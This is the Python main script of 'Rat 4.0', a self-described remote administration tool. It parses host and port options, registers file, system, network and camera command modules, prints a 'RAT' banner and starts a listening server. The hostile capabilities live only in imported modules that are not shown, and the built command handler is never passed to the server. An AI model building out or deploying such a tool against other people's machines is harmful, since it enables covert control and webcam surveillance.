#!/usr/bin/env python3
"""
Rat 4.0 - Remote Administration Tool

This is a modular implementation of a remote administration tool that provides
various system administration capabilities over a network connection.
"""

import os
import sys
import time
import signal
import argparse
from typing import Optional, Dict, Any

# Add the project root to the Python path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from network.server import start_server
from commands.base_command import CommandHandler
from commands.file_commands import register_file_commands
from commands.system_commands import register_system_commands
from commands.network_commands import register_network_commands
from commands.camera_commands import register_camera_commands
from utils.constants import HOST, PORT

# Global server instance
server_instance = None

def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description='Rat 4.0 - Remote Administration Tool')
    parser.add_argument('--host', type=str, default=HOST,
                       help=f'Host to bind to (default: {HOST})')
    parser.add_argument('--port', type=int, default=PORT,
                       help=f'Port to listen on (default: {PORT})')
    parser.add_argument('--debug', action='store_true',
                       help='Enable debug output')
    return parser.parse_args()

def setup_signal_handlers():
    """Setup signal handlers for graceful shutdown."""
    def signal_handler(sig, frame):
        print("\nShutting down gracefully...")
        global server_instance
        if server_instance:
            server_instance.stop()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

def initialize_command_handler() -> CommandHandler:
    """Initialize and configure the command handler with all available commands."""
    handler = CommandHandler()
    
    # Register all command handlers
    register_file_commands(handler)
    register_system_commands(handler)
    register_network_commands(handler)
    register_camera_commands(handler)
    
    return handler

def print_banner():
    """Print the application banner."""
    banner = """
    ██████╗  █████╗ ████████╗
    ██╔══██╗██╔══██╗╚══██╔══╝
    ██████╔╝███████║   ██║   
    ██╔══██╗██╔══██║   ██║   
    ██║  ██║██║  ██║   ██║   
    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
    Remote Administration Tool v4.0
    """
    print(banner)

def main():
    """Main entry point for the application."""
    global server_instance
    
    # Parse command line arguments
    args = parse_arguments()
    
    # Setup signal handlers for graceful shutdown
    setup_signal_handlers()
    
    # Initialize command handler
    command_handler = initialize_command_handler()
    
    # Print banner
    print_banner()
    
    try:
        # Start the server
        print(f"Starting server on {args.host}:{args.port}")
        server_instance = start_server(args.host, args.port)
        
        # Keep the main thread alive
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\nShutting down...")
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        sys.exit(1)
    finally:
        if server_instance:
            server_instance.stop()

if __name__ == "__main__":
    main()
